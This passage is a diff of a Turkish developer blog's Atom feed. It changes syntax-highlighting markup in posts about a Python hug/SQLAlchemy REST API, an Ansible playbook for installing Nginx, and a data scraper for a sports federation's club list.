     &lt;span class="n"&gt;__tablename__&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;books&amp;#39;&lt;/span&gt;
-    &lt;span class="nb"&gt;id&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sa&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Column&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sa&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Integer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;primary_key&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="nb"&gt;id&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sa&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Column&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sa&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Integer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;primary_key&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="kc"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
     &lt;span class="n"&gt;title&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sa&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Column&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sa&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
     &lt;span class="n"&gt;author_id&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sa&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Column&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sa&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Integer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;sa&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ForeignKey&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;authors.id&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
     &lt;span class="n"&gt;author&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;relationship&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Author&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;backref&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;backref&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;books&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
@@ -1345,7 +1571,7 @@ Kullanıcılar tarafından oluşturulmuş public kutulara ulaşmak için aşağ�
 &lt;h3&gt;Main Dosyamız&lt;/h3&gt;
 &lt;p&gt;Hemen kodları yapıştırıp açıklamayı kodların üstünde yapacağım.&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;#-*- coding:utf-8 -*-&lt;/span&gt;
-&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sqlalchemy&lt;/span&gt; &lt;span class="kn"&gt;as&lt;/span&gt; &lt;span class="nn"&gt;sa&lt;/span&gt;
+&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sqlalchemy&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="nn"&gt;sa&lt;/span&gt;
 &lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;sqlalchemy.orm&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;sessionmaker&lt;/span&gt;
 &lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;models&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;Author&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;Book&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;Base&lt;/span&gt; &lt;span class="c1"&gt;# Modellerimizi import ediyoruz.&lt;/span&gt;
 &lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;schemas&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;AuthorSchema&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;BookSchema&lt;/span&gt; &lt;span class="c1"&gt;#Şemalarımızı import ediyoruz.&lt;/span&gt;
@@ -1361,24 +1587,24 @@ Kullanıcılar tarafından oluşturulmuş public kutulara ulaşmak için aşağ�
 
 
 
-&lt;span class="nd"&gt;@hug.get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/books&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# /books/ adresine get isteği yapıldığında aşağısı çalışsın diyoruz.&lt;/span&gt;
+&lt;span class="nd"&gt;@hug&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/books&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# /books/ adresine get isteği yapıldığında aşağısı çalışsın diyoruz.&lt;/span&gt;
 &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;getbooks&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt; 
     &lt;span class="n"&gt;books&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;session&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;query&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Book&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;all&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="c1"&gt;# ORM olarak bütün Book tablosunu alıyoruz.&lt;/span&gt;
-    &lt;span class="n"&gt;bookschema&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;BookSchema&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;many&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# Buradan da Book şemamızı alıyoruz.&lt;/span&gt;
+    &lt;span class="n"&gt;bookschema&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;BookSchema&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;many&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="kc"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# Buradan da Book şemamızı alıyoruz.&lt;/span&gt;
     &lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;bookschema&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;dump&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;books&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="c1"&gt;# Book şemamızı book tablosu ile bağdaştırıp dataları alıyoruz.&lt;/span&gt;
     &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;status&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;HTTP_404&lt;/span&gt; &lt;span class="c1"&gt;# 404 Döndürüyoruz. Açıklayacağım.&lt;/span&gt;
     &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="c1"&gt;#Datamızı Döndürüyoruz.&lt;/span&gt;
 
 
-&lt;span class="nd"&gt;@hug.post&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/books&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# /books/ adresine post isteği yapıldığında aşağısını çalıştır babuş.&lt;/span&gt;
+&lt;span class="nd"&gt;@hug&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;post&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/books&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# /books/ adresine post isteği yapıldığında aşağısını çalıştır babuş.&lt;/span&gt;
 &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;addbooks&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;body&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt; &lt;span class="c1"&gt;# body isteğin body&amp;#39;sini belirtir.&lt;/span&gt;
     &lt;span class="n"&gt;authorid&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;body&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;author_id&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="c1"&gt;# body içerisinde ki author_id yi değişkene atadım.&lt;/span&gt;
     &lt;span class="n"&gt;bookname&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;body&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;bookname&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="c1"&gt;# body içerisinde ki bookname&amp;#39;i değişkene atadım.&lt;/span&gt;
     &lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
         &lt;span class="n"&gt;bookname&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;authorid&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;bookname&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;decode&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt; &lt;span class="n"&gt;authorid&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;decode&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
         &lt;span class="n"&gt;checkauthor&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;session&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;query&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Author&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;filter_by&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;id&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;authorid&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;first&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="c1"&gt;# gelen id&amp;#39;ye sahip yazar var mı kontrol ediyorum.&lt;/span&gt;
-        &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;checkauthor&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# kontrol için koydum.&lt;/span&gt;
-        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;checkauthor&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; 
+        &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;checkauthor&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# kontrol için koydum.&lt;/span&gt;
+        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;checkauthor&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="kc"&gt;None&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; 
             &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;status&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;HTTP_404&lt;/span&gt; &lt;span class="c1"&gt;# Eğer yazar yoksa 404 döndür diyorum.&lt;/span&gt;
             &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;HTTP_404&lt;/span&gt;
         &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
@@ -1391,7 +1617,7 @@ Kullanıcılar tarafından oluşturulmuş public kutulara ulaşmak için aşağ�
     &lt;span class="k"&gt;except&lt;/span&gt; &lt;span class="ne"&gt;TypeError&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
         &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;status&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;HTTP_404&lt;/span&gt;
         &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;falcon&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;HTTP_404&lt;/span&gt;
-&lt;span class="nd"&gt;@hug.post&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/authors&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="nd"&gt;@hug&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;post&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/authors&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
 &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;addauthors&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;body&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
     &lt;span class="n"&gt;session&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;rollback&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
     &lt;span class="n"&gt;author_name&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;body&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;author_name&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
@@ -1400,10 +1626,10 @@ Kullanıcılar tarafından oluşturulmuş public kutulara ulaşmak için aşağ�
     &lt;span class="n"&gt;session&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;commit&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
     &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;status&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;HTTP_202&lt;/span&gt;
     &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;falcon&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;HTTP_202&lt;/span&gt;
-&lt;span class="nd"&gt;@hug.get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/authors&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="nd"&gt;@hug&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/authors&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
 &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;getauthors&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
     &lt;span class="n"&gt;authors&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;session&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;query&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Author&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;all&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
-    &lt;span class="n"&gt;authorschema&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;AuthorSchema&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;many&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="n"&gt;authorschema&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;AuthorSchema&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;many&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="kc"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
     &lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;authorschema&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;dumps&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;authors&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;
     &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
@@ -1435,7 +1661,7 @@ Kullanıcılar tarafından oluşturulmuş public kutulara ulaşmak için aşağ�
 &lt;p&gt;İşin özetine gelirsek aslında yapacağınız uygulamalar bundan da farklı değil. Biraz daha database işlemleri karmaşıklaşıyor vs.vs&lt;/p&gt;
 &lt;p&gt;Neyse basit bir şekilde API yapımı bu kadar.&lt;/p&gt;
 &lt;p&gt;Teşekkürler okuduğunuz için.&lt;/p&gt;
-&lt;p&gt;&lt;img alt="nicecommit" src="images/commitebak.png"&gt;&lt;/p&gt;</content><category term="python"></category><category term="hug"></category><category term="api"></category><category term="sqlalchemy"></category></entry><entry><title>Ansible ile Nginx Kurulum ve Yapılandırılması vol.1</title><link href="https://enesergun.net/ansible-nginx.html" rel="alternate"></link><published>2017-09-20T10:20:00+03:00</published><updated>2017-09-20T10:20:00+03:00</updated><author><name>0x656e</name></author><id>tag:enesergun.net,2017-09-20:/ansible-nginx.html</id><summary type="html">&lt;p&gt;&lt;img alt="Nginx" src="images/nginxansible.png" title="nginx"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="nicecommit" src="images/commitebak.png"&gt;&lt;/p&gt;</content><category term="python"></category><category term="python"></category><category term="hug"></category><category term="api"></category><category term="sqlalchemy"></category></entry><entry><title>Ansible ile Nginx Kurulum ve Yapılandırılması vol.1</title><link href="https://enesergun.net/ansible-nginx.html" rel="alternate"></link><published>2017-09-20T10:20:00+03:00</published><updated>2017-09-20T10:20:00+03:00</updated><author><name>0x656e</name></author><id>tag:enesergun.net,2017-09-20:/ansible-nginx.html</id><summary type="html">&lt;p&gt;&lt;img alt="Nginx" src="images/nginxansible.png" title="nginx"&gt;&lt;/p&gt;
 &lt;h1&gt;Ansible ile Nginx Kurulum ve Yapılandırılması&lt;/h1&gt;
 &lt;h2&gt;Ansible Nedir?&lt;/h2&gt;
 &lt;p&gt;Ansible deployment işlerinizi otomatikleştirebileceğiniz bir betik dilidir. (?)
@@ -1505,26 +1731,26 @@ ayrı bir role yazmaktayım. Bahsetmeden olmaz test sunucumda Centos kullanmakta
 
 &lt;p&gt;Burada açıklanacak çok fazla birşey yok sanırım. Siz buraya istediğiniz kadar ip ekleyebilirsiniz. Ansible bu yazdığınız tüm IP'leri gezerek kurulumları sağlayacaktır.&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt; Site.yml Dosyamızı Oluşturalım &lt;/strong&gt;&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;---
-    - include dbplaybook.yml
-    - include webplaybook.yml
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;---&lt;/span&gt;
+&lt;span class="err"&gt;    - include dbplaybook.yml&lt;/span&gt;
+&lt;span class="err"&gt;    - include webplaybook.yml&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;İki tane ansible dosyamı include ettim. DBPlaybook'una daha sonra bakacağız.&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt; Webplaybook.yml Dosyamızı oluşturalım &lt;/strong&gt;&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;---
-- name: Create a Web Server and ETC
-  hosts: web
-  become: yes
-  become_user: root
-  remote_user: root
-  vars_files:
-    - vars/main.yml
-  roles:
-    - base
-    - web
-    - nginx
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;---&lt;/span&gt;
+&lt;span class="err"&gt;- name: Create a Web Server and ETC&lt;/span&gt;
+&lt;span class="err"&gt;  hosts: web&lt;/span&gt;
+&lt;span class="err"&gt;  become: yes&lt;/span&gt;
+&lt;span class="err"&gt;  become_user: root&lt;/span&gt;
+&lt;span class="err"&gt;  remote_user: root&lt;/span&gt;
+&lt;span class="err"&gt;  vars_files:&lt;/span&gt;
+&lt;span class="err"&gt;    - vars/main.yml&lt;/span&gt;
+&lt;span class="err"&gt;  roles:&lt;/span&gt;
+&lt;span class="err"&gt;    - base&lt;/span&gt;
+&lt;span class="err"&gt;    - web&lt;/span&gt;
+&lt;span class="err"&gt;    - nginx&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -1585,11 +1811,11 @@ Daha sonra ise döngüye soktuğumuz itemları sırası ile kurdurmak. with_item
 &lt;p&gt;Kalan kısımlarda command ile direk olarak shell'e komutu bir döngü sayesinde basmaktayız.
 Notify kısmı ise bizim handlers kısmında ismini verdiğimiz görevleri yerine getirir.&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt; Handlers dosyasına bir göz atalım. &lt;/strong&gt;&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;---
-- name: restart firewall
-  service: name=firewalld state=restarted
-- name: restart nginx
-  service: name=nginx state=restarted
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;---&lt;/span&gt;
+&lt;span class="err"&gt;- name: restart firewall&lt;/span&gt;
+&lt;span class="err"&gt;  service: name=firewalld state=restarted&lt;/span&gt;
+&lt;span class="err"&gt;- name: restart nginx&lt;/span&gt;
+&lt;span class="err"&gt;  service: name=nginx state=restarted&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -1633,11 +1859,11 @@ Notify kısmı ise bizim handlers kısmında ismini verdiğimiz görevleri yerin
 
 &lt;p&gt;Burada nginx için kullanıcı ve grup eklemekteyiz.&lt;/p&gt;
 &lt;h2&gt;Vars Dosyamız&lt;/h2&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;---
-    # Nginx
-    project_domain: 0x656e.com
-    nginx_group: webapps
-    nginx_user: project
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;---&lt;/span&gt;
+&lt;span class="err"&gt;    # Nginx&lt;/span&gt;
+&lt;span class="err"&gt;    project_domain: 0x656e.com&lt;/span&gt;
+&lt;span class="err"&gt;    nginx_group: webapps&lt;/span&gt;
+&lt;span class="err"&gt;    nginx_user: project&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -1652,7 +1878,7 @@ Notify kısmı ise bizim handlers kısmında ismini verdiğimiz görevleri yerin
 
 &lt;p&gt;Vol 2 de bu dosyaların üstüne bir çok şey ekleyerek devam edeceğiz.
 Şuan yapılan çalışmanın kodlarına erişmek isterseniz.&lt;/p&gt;
-&lt;p&gt;&lt;a href="https://github.com/ka1nsha/ansible-nginx"&gt;Tıklayınız&lt;/a&gt;&lt;/p&gt;</content><category term="ansible"></category><category term="nginx"></category></entry><entry><title>TSF Parser</title><link href="https://enesergun.net/tsf-parser.html" rel="alternate"></link><published>2016-06-28T10:20:00+03:00</published><updated>2016-06-28T10:20:00+03:00</updated><author><name>0x656e</name></author><id>tag:enesergun.net,2016-06-28:/tsf-parser.html</id><summary type="html">&lt;p&gt;Selamlar arkadaşlar bu postta twitterda bir arkadaşımın paylaştığı linkte bulunan verileri çekeceğiz.Bu kod beni baya bi uğraştırdı. Aslında uğraştırmaması gerekiyordu fakat ilk olarak parse etmek için regex kullanmayı düşündüm.Fakat regex ile yeterince hızlı olmuyordu bu işlem xpath kullanmak istedim işte tüm sorunlar bundan sonra başladı.Öncelikle çekeceğimiz linki …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Selamlar arkadaşlar bu postta twitterda bir arkadaşımın paylaştığı linkte bulunan verileri çekeceğiz.Bu kod beni baya bi uğraştırdı. Aslında uğraştırmaması gerekiyordu fakat ilk olarak parse etmek için regex kullanmayı düşündüm.Fakat regex ile yeterince hızlı olmuyordu bu işlem xpath kullanmak istedim işte tüm sorunlar bundan sonra başladı.Öncelikle çekeceğimiz linki vereyim. &lt;a href="https://lisans.tsf.org.tr/online/main/kulupliste/"&gt;Tsf.org.tr&lt;/a&gt;  Siteye girdiğinizde eğer bir külubü görüntülerseniz özel id atandığını göreceksiniz.Yani aslında arkaplanda post ile verileri alırken 206 id li veriyi çekiyor fakat adress bar da bu 100545254 şeklinde gözükmekte. Eğer bunu farketmeseydim her döngüde 1 artan bir değişkenle işimi halletmeye çalışacaktım.Bu işlem epey uzun oluyordu :)&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://github.com/ka1nsha/ansible-nginx"&gt;Tıklayınız&lt;/a&gt;&lt;/p&gt;</content><category term="ansible"></category><category term="ansible"></category><category term="nginx"></category></entry><entry><title>TSF Parser</title><link href="https://enesergun.net/tsf-parser.html" rel="alternate"></link><published>2016-06-28T10:20:00+03:00</published><updated>2016-06-28T10:20:00+03:00</updated><author><name>0x656e</name></author><id>tag:enesergun.net,2016-06-28:/tsf-parser.html</id><summary type="html">&lt;p&gt;Selamlar arkadaşlar bu postta twitterda bir arkadaşımın paylaştığı linkte bulunan verileri çekeceğiz.Bu kod beni baya bi uğraştırdı. Aslında uğraştırmaması gerekiyordu fakat ilk olarak parse etmek için regex kullanmayı düşündüm.Fakat regex ile yeterince hızlı olmuyordu bu işlem xpath kullanmak istedim işte tüm sorunlar bundan sonra başladı.Öncelikle çekeceğimiz linki …&lt;/p&gt;</summary><content 